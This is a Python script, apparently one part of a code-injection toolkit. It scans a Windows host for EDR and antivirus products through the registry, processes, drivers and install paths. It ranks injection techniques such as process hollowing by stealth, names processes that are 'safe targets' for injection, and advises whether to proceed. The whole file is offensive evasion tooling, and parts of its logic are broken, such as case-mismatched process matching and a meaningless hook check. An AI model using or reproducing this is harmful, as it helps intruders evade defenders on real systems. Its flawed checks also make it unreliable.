#!/usr/bin/env python3
"""
EDR Detection & Environment Analysis - Phase 4 Code Injection
Detects EDR presence, process monitoring, and safe execution environments
"""

import ctypes
import logging
import subprocess
import json
from pathlib import Path
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("EDRDetection")


class ThreatLevel(Enum):
    """Threat level for injection environment"""
    SAFE = "safe"              # No EDR detected
    CAUTION = "caution"        # EDR present but older version
    DANGEROUS = "dangerous"    # Advanced EDR with kernel driver
    IMPOSSIBLE = "impossible" # Impossible to inject safely


class EDRProduct(Enum):
    """Known EDR products and signatures"""
    WINDOWS_DEFENDER = "windows_defender"
    KASPERSKY = "kaspersky"
    CROWDSTRIKE_FALCON = "crowdstrike_falcon"
    SENTINELONE = "sentinelone"
    CARBONBLACK = "carbonblack"
    CORTEX_XDR = "cortex_xdr"
    MCAFEE_MVISION = "mcafee_mvision"
    WAZUH = "wazuh"
    OSQUERY = "osquery"
    UNKNOWN = "unknown"


@dataclass
class EDRDetectionResult:
    """Result of EDR detection analysis"""
    edr_detected: bool
    threat_level: ThreatLevel
    detected_products: List[Tuple[EDRProduct, str]]  # (Product, Version/Path)
    monitored_processes: List[str]  # Processes we should avoid
    injection_techniques: List[str]  # Safe techniques to use
    risk_factors: Dict[str, bool]  # kernel_driver, hook_ssdt, kernel_callbacks, etc.
    recommendation: str


class EDRDetectionEngine:
    """
    Detect EDR presence and determine safe injection techniques
    
    Detection Methods:
    1. Registry scanning for known EDR installations
    2. Process enumeration for EDR services
    3. File system analysis for EDR drivers/hooks
    4. Memory analysis for kernel-mode monitoring
    5. System-wide API hooking detection
    """
    
    # Known EDR process patterns (avoid or handle with extreme care)
    PROTECTED_PROCESSES = {
        # System critical
        "smss.exe", "csrss.exe", "lsass.exe", "ntoskrnl.exe", "winlogon.exe",
        # Defender
        "MsMpEng.exe", "SecurityHealthService.exe", "WinDefend", "mpnotify.exe",
        # CrowdStrike
        "csfalcon.exe", "falcon.exe", "CSFalconConf.exe",
        # Sentinel One
        "SentinelAgent.exe", "STOAgent.exe",
        # Carbon Black
        "CbDefense.exe", "wscsvc.exe", "bc.exe",
        # Kaspersky
        "avp.exe", "kavtray.exe",
        # Cortex
        "cagentd.exe", "cypwned.exe",
        # McAfee
        "sMaVoice.exe", "McShield.exe", "masvc.exe",
        # Tools that monitor processes
        "procmon.exe", "autoruns.exe", "netmon.exe", "wireshark.exe",
    }
    
    # EDR Registry keys
    EDR_REGISTRY_KEYS = {
        "HKLM\\SOFTWARE\\Microsoft\\Windows Defender": EDRProduct.WINDOWS_DEFENDER,
        "HKLM\\SOFTWARE\\CrowdStrike": EDRProduct.CROWDSTRIKE_FALCON,
        "HKLM\\SOFTWARE\\SentinelOne": EDRProduct.SENTINELONE,
        "HKLM\\SOFTWARE\\Kaspersky Lab": EDRProduct.KASPERSKY,
        "HKLM\\SOFTWARE\\VMware\\Carbon Black": EDRProduct.CARBONBLACK,
        "HKLM\\SOFTWARE\\Palo Alto Networks": EDRProduct.CORTEX_XDR,
        "HKLM\\SOFTWARE\\Network Associates\\McAfee": EDRProduct.MCAFEE_MVISION,
    }
    
    # Injection techniques ranked by stealth
    TECHNIQUE_RANKING = {
        "process_hollowing": 5,        # Most stealthy
        "reflective_dll": 4,           # Very stealthy
        "setwindowshookex": 3,         # Medium stealth (works with user mode only)
        "queueuserapc": 3,             # Medium stealth
        "thread_hijacking": 2,         # Risky
        "remote_thread": 1,            # Detectable (fallback)
        "loadlibrary": 0,              # Worst (most detectable)
    }
    
    def __init__(self):
        self.kernel32 = ctypes.WinDLL("kernel32", use_errno=True)
        try:
            self.ntdll = ctypes.WinDLL("ntdll", use_errno=True)
        except:
            self.ntdll = None
    
    def analyze_environment(self) -> EDRDetectionResult:
        """
        Comprehensive EDR detection and environment analysis
        
        Returns:
            EDRDetectionResult with threat assessment and recommendations
        """
        log.info("🔍 Analyzing execution environment for EDR presence...")
        
        detected_products = []
        risk_factors = {}
        threat_indicators = 0
        
        # Step 1: Registry scanning
        log.info("  1. Scanning registry for EDR installations...")
        registry_edr = self._scan_registry()
        detected_products.extend(registry_edr)
        threat_indicators += len(registry_edr)
        
        # Step 2: Process enumeration
        log.info("  2. Scanning processes for EDR services...")
        process_edr = self._scan_processes()
        detected_products.extend(process_edr)
        threat_indicators += len(process_edr)
        
        # Step 3: Driver detection
        log.info("  3. Checking for kernel-mode drivers...")
        risk_factors["kernel_driver"] = self._detect_kernel_drivers()
        if risk_factors["kernel_driver"]:
            threat_indicators += 2
        
        # Step 4: API hooking detection
        log.info("  4. Checking for API hooking...")
        risk_factors["api_hooking"] = self._detect_api_hooking()
        if risk_factors["api_hooking"]:
            threat_indicators += 2
        
        # Step 5: File system analysis
        log.info("  5. Scanning file system for EDR artifacts...")
        risk_factors["edr_files"] = self._scan_file_system()
        if risk_factors["edr_files"]:
            threat_indicators += 1
        
        # Determine threat level
        if threat_indicators == 0:
            threat_level = ThreatLevel.SAFE
        elif threat_indicators <= 2:
            threat_level = ThreatLevel.CAUTION
        elif threat_indicators <= 4:
            threat_level = ThreatLevel.DANGEROUS
        else:
            threat_level = ThreatLevel.IMPOSSIBLE
        
        # Select safe injection techniques
        safe_techniques = self._select_safe_techniques(threat_level, detected_products)
        
        # Identify monitored processes to avoid
        monitored = self._identify_monitored_processes(detected_products)
        
        # Generate recommendation
        recommendation = self._generate_recommendation(threat_level, safe_techniques)
        
        result = EDRDetectionResult(
            edr_detected=bool(detected_products),
            threat_level=threat_level,
            detected_products=detected_products,
            monitored_processes=monitored,
            injection_techniques=safe_techniques,
            risk_factors=risk_factors,
            recommendation=recommendation
        )
        
        log.info(f"🎯 Environment Analysis Complete:")
        log.info(f"   Threat Level: {result.threat_level.value.upper()}")
        log.info(f"   EDR Detected: {len(detected_products)} product(s)")
        log.info(f"   Safe Techniques: {', '.join(safe_techniques) if safe_techniques else 'NONE'}")
        
        return result
    
    def _scan_registry(self) -> List[Tuple[EDRProduct, str]]:
        """Scan registry for EDR installations"""
        detected = []
        
        for reg_key, edr_product in self.EDR_REGISTRY_KEYS.items():
            try:
                # Attempt to read key - presence indicates EDR
                result = subprocess.run(
                    ["reg", "query", reg_key],
                    capture_output=True,
                    timeout=5
                )
                
                if result.returncode == 0:
                    # Extract version if possible
                    version = "installed"
                    detected.append((edr_product, version))
                    log.info(f"  ✅ Detected: {edr_product.value} (via registry)")
                    
            except Exception as e:
                pass
        
        return detected
    
    def _scan_processes(self) -> List[Tuple[EDRProduct, str]]:
        """Scan running processes for EDR services"""
        detected = []
        
        try:
            import psutil
            
            # Map process names to EDR products
            process_edr_map = {
                "MsMpEng.exe": EDRProduct.WINDOWS_DEFENDER,
                "csfalcon.exe": EDRProduct.CROWDSTRIKE_FALCON,
                "STOAgent.exe": EDRProduct.SENTINELONE,
                "CbDefense.exe": EDRProduct.CARBONBLACK,
                "avp.exe": EDRProduct.KASPERSKY,
                "cagentd.exe": EDRProduct.CORTEX_XDR,
                "McShield.exe": EDRProduct.MCAFEE_MVISION,
                "wazuh-agent.exe": EDRProduct.WAZUH,
                "osqueryd.exe": EDRProduct.OSQUERY,
            }
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if proc_name in process_edr_map:
                        edr_product = process_edr_map[proc_name]
                        detected.append((edr_product, f"PID={proc.info['pid']}"))
                        log.info(f"  ✅ Detected: {edr_product.value} (PID {proc.info['pid']})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        
        except ImportError:
            log.warning("  ⚠️  psutil not available for process scanning")
        
        return detected
    
    def _detect_kernel_drivers(self) -> bool:
        """Detect if kernel-mode drivers are loaded"""
        try:
            # List loaded drivers via Windows API
            result = subprocess.run(
                ["wmic", "sysdriver", "list"],
                capture_output=True,
                timeout=10
            )
            
            if result.returncode == 0:
                output = result.stdout.decode('utf-8', errors='ignore')
                
                # Look for EDR driver signatures
                edr_drivers = [
                    "crowdstrike", "falcon", "sentinelone", "cbcomms",
                    "kaspersky", "mcafee", "cortex", "wazuh",
                    "defender", "mpk", "windefend"
                ]
                
                for driver_name in edr_drivers:
                    if driver_name.lower() in output.lower():
                        log.info(f"  ✅ Detected EDR kernel driver: {driver_name}")
                        return True
        
        except Exception as e:
            pass
        
        return False
    
    def _detect_api_hooking(self) -> bool:
        """Detect SSDT/IAT API hooking"""
        # Simple heuristic: check if certain APIs are hooked
        try:
            # This is a simplified check - real detection is more complex
            # Check if CreateRemoteThread is at expected address
            
            kernel32 = self.kernel32
            ntdll = self.ntdll
            
            if not ntdll:
                return False
            
            # Get expected addresses
            crt_addr = kernel32.GetProcAddress(
                kernel32.GetModuleHandleA(b"kernel32.dll"),
                b"CreateRemoteThread"
            )
            
            # If address is in unusual range, might be hooked
            # This is a heuristic - real detection is more sophisticated
            if crt_addr and crt_addr < 0x70000000:
                # Might be user-mode hooked
                log.info("  ⚠️  Possible API hooking detected")
                return True
        
        except Exception as e:
            pass
        
        return False
    
    def _scan_file_system(self) -> bool:
        """Scan file system for EDR artifacts"""
        edr_paths = [
            "C:\\Program Files\\CrowdStrike",
            "C:\\Program Files\\SentinelOne",
            "C:\\Program Files\\Kaspersky Lab",
            "C:\\Program Files\\Carbon Black",
            "C:\\Program Files\\Palo Alto Networks",
            "C:\\Program Files (x86)\\McAfee",
            "C:\\ProgramData\\Wazuh",
        ]
        
        for path in edr_paths:
            if Path(path).exists():
                log.info(f"  ✅ Detected EDR directory: {path}")
                return True
        
        return False
    
    def _select_safe_techniques(self, threat_level: ThreatLevel, 
                               detected_products: List[Tuple[EDRProduct, str]]) -> List[str]:
        """Select safe injection techniques based on threat level"""
        
        if threat_level == ThreatLevel.IMPOSSIBLE:
            return []
        elif threat_level == ThreatLevel.DANGEROUS:
            # Only use most stealthy techniques
            return ["process_hollowing", "reflective_dll"]
        elif threat_level == ThreatLevel.CAUTION:
            # Can use most techniques
            return ["process_hollowing", "reflective_dll", "setwindowshookex", "queueuserapc"]
        else:  # SAFE
            return ["process_hollowing", "reflective_dll", "setwindowshookex", 
                   "queueuserapc", "thread_hijacking", "remote_thread"]
    
    def _identify_monitored_processes(self, detected_products: List[Tuple[EDRProduct, str]]) -> List[str]:
        """Identify processes monitored by detected EDR products"""
        
        monitored = list(self.PROTECTED_PROCESSES)
        
        # Add product-specific monitored processes
        edr_monitors = {
            EDRProduct.WINDOWS_DEFENDER: ["MsMpEng.exe", "SecurityHealthService.exe"],
            EDRProduct.CROWDSTRIKE_FALCON: ["csfalcon.exe", "falcon.exe"],
            EDRProduct.SENTINELONE: ["SentinelAgent.exe", "STOAgent.exe"],
        }
        
        for product, _ in detected_products:
            if product in edr_monitors:
                monitored.extend(edr_monitors[product])
        
        # Safe to target (normal processes)
        safe_targets = [
            "explorer.exe",      # User explorer (always running)
            "svchost.exe",       # Multiple instances
            "dllhost.exe",       # COM process
            "taskhost.exe",      # Task scheduler
            "rundll32.exe",      # Already legitimately spawns
            "regsvcs.exe",       # .NET registration
            "connhost.exe",      # Network
        ]
        
        monitored = [p for p in monitored if p not in safe_targets]
        
        return monitored
    
    def _generate_recommendation(self, threat_level: ThreatLevel, safe_techniques: List[str]) -> str:
        """Generate actionable recommendation"""
        
        if threat_level == ThreatLevel.IMPOSSIBLE:
            return "⛔️  DO NOT ATTEMPT INJECTION - Kernel-mode EDR will detect and block any injection technique"
        elif threat_level == ThreatLevel.DANGEROUS:
            return f"⚠️  EXTREME CAUTION - Use only: {', '.join(safe_techniques)}. Expect detection within minutes"
        elif threat_level == ThreatLevel.CAUTION:
            return f"✅ PROCEED WITH CAUTION - Use: {', '.join(safe_techniques)}. Avoid protected processes"
        else:
            return f"✅ SAFE TO PROCEED - All techniques available: {', '.join(safe_techniques)}"


if __name__ == "__main__":
    detector = EDRDetectionEngine()
    result = detector.analyze_environment()
    
    print("\n" + "="*70)
    print(f"Threat Level: {result.threat_level.value.upper()}")
    print(f"EDR Detected: {result.edr_detected}")
    print(f"Safe Techniques: {result.injection_techniques}")
    print(f"Recommendation: {result.recommendation}")
    print("="*70)
